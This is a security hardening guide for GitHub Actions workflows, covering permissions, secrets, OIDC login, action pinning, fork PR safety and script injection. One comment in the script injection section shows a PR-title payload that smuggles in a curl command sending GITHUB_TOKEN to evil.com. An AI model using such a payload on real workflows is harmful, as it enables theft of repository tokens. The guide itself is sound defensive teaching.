# Security Hardening Guide

## Principle: Least Privilege by Default

Every workflow should start with the minimum permissions needed and expand only when necessary.

---

## Permissions

### Always set explicit permissions

```yaml
# Top-level: restrict all jobs by default
permissions:
  contents: read

jobs:
  deploy:
    # Job-level: expand only where needed
    permissions:
      contents: read
      deployments: write
      id-token: write    # For OIDC
```

### Common permission patterns

| Use Case | Permissions Needed |
|----------|--------------------|
| Read code only | `contents: read` |
| Push to GHCR | `contents: read`, `packages: write` |
| Comment on PR | `contents: read`, `pull-requests: write` |
| Create release | `contents: write` |
| Deploy with OIDC | `contents: read`, `id-token: write` |
| Update status checks | `contents: read`, `statuses: write` |
| Modify issues | `contents: read`, `issues: write` |

### Disable all permissions (for pure compute jobs)

```yaml
permissions: {}
```

---

## Secrets Management

### Using secrets properly

```yaml
# GOOD: Use GitHub Secrets
env:
  API_KEY: ${{ secrets.API_KEY }}

# GOOD: Use environment-scoped secrets
jobs:
  deploy:
    environment: production
    steps:
      - run: ./deploy.sh
        env:
          DEPLOY_TOKEN: ${{ secrets.PROD_DEPLOY_TOKEN }}
```

### Secret masking

```yaml
# GitHub automatically masks secrets in logs, but be careful with:
- name: Be careful with structured output
  run: |
    # BAD: This might leak parts of the secret
    echo "Config: {\"key\": \"${{ secrets.API_KEY }}\"}"

    # GOOD: Use environment variables
    ./configure.sh
  env:
    API_KEY: ${{ secrets.API_KEY }}
```

### Never use secrets in these contexts

```yaml
# BAD: Secret in conditional (logged in debug mode)
if: secrets.DEPLOY_TOKEN != ''

# GOOD: Check for secret existence safely
if: env.HAS_TOKEN == 'true'
env:
  HAS_TOKEN: ${{ secrets.DEPLOY_TOKEN != '' }}
```

---

## OIDC Authentication (preferred over long-lived tokens)

### AWS with OIDC

```yaml
permissions:
  id-token: write
  contents: read

steps:
  - uses: aws-actions/configure-aws-credentials@v4
    with:
      role-to-assume: arn:aws:iam::123456789012:role/GitHubActions
      aws-region: us-east-1
```

### GCP with OIDC

```yaml
permissions:
  id-token: write
  contents: read

steps:
  - uses: google-github-actions/auth@v2
    with:
      workload_identity_provider: 'projects/123/locations/global/workloadIdentityPools/github/providers/my-repo'
      service_account: 'deploy@my-project.iam.gserviceaccount.com'
```

### Azure with OIDC

```yaml
permissions:
  id-token: write
  contents: read

steps:
  - uses: azure/login@v2
    with:
      client-id: ${{ secrets.AZURE_CLIENT_ID }}
      tenant-id: ${{ secrets.AZURE_TENANT_ID }}
      subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
```

---

## Supply Chain Security

### Pin actions to full commit SHA (most secure)

```yaml
# GOOD: Pinned to SHA (immune to tag hijacking)
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2

# ACCEPTABLE: Pinned to major version (convenient, but verify trust)
- uses: actions/checkout@v4

# BAD: Using branch references
- uses: actions/checkout@main
```

### Use Dependabot for action updates

Create `.github/dependabot.yml`:

```yaml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    groups:
      actions:
        patterns:
          - "*"
```

### Restrict third-party actions

```yaml
# Prefer official actions (actions/*, github/*)
# Vet third-party actions before use:
# 1. Check the action's repository for source code
# 2. Verify it's from a trusted publisher (verified badge)
# 3. Check star count, maintenance activity, and open issues
# 4. Pin to a specific commit SHA
```

---

## Fork and PR Security

### Protect secrets from fork PRs

```yaml
on:
  pull_request_target:    # Runs in context of base repo (has secrets)
    types: [opened, synchronize]

jobs:
  # Safe: doesn't use PR code
  label:
    runs-on: ubuntu-latest
    permissions:
      pull-requests: write
    steps:
      - run: echo "Labeling PR"

  # DANGEROUS: Never checkout PR code in pull_request_target
  # without careful validation
```

### Safe pattern for fork PRs needing secrets

```yaml
# Step 1: Build in PR context (no secrets, untrusted code)
on:
  pull_request:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm run build
      - uses: actions/upload-artifact@v4
        with:
          name: build
          path: dist/

# Step 2: Deploy in separate workflow (has secrets, trusted trigger)
on:
  workflow_run:
    workflows: ["Build"]
    types: [completed]
jobs:
  deploy-preview:
    if: github.event.workflow_run.conclusion == 'success'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
```

---

## Script Injection Prevention

### Vulnerable pattern

```yaml
# BAD: PR title is user-controlled input
- name: Greet
  run: echo "PR Title: ${{ github.event.pull_request.title }}"
  # Attacker can set title to: "; curl evil.com/steal?token=$GITHUB_TOKEN
```

### Safe pattern

```yaml
# GOOD: Use environment variable (not interpolated in shell)
- name: Greet
  run: echo "PR Title: $PR_TITLE"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
```

### User-controlled inputs to always sanitize

- `github.event.pull_request.title`
- `github.event.pull_request.body`
- `github.event.issue.title`
- `github.event.issue.body`
- `github.event.comment.body`
- `github.event.review.body`
- `github.event.head_commit.message`
- `github.head_ref` (branch names)

---

## Branch Protection Integration

Recommended branch protection rules for `main`:

1. Require status checks to pass before merging
2. Require branches to be up to date
3. Require signed commits (optional but recommended)
4. Restrict who can push to matching branches
5. Require pull request reviews (at least 1 approval)
6. Do not allow bypassing the above settings
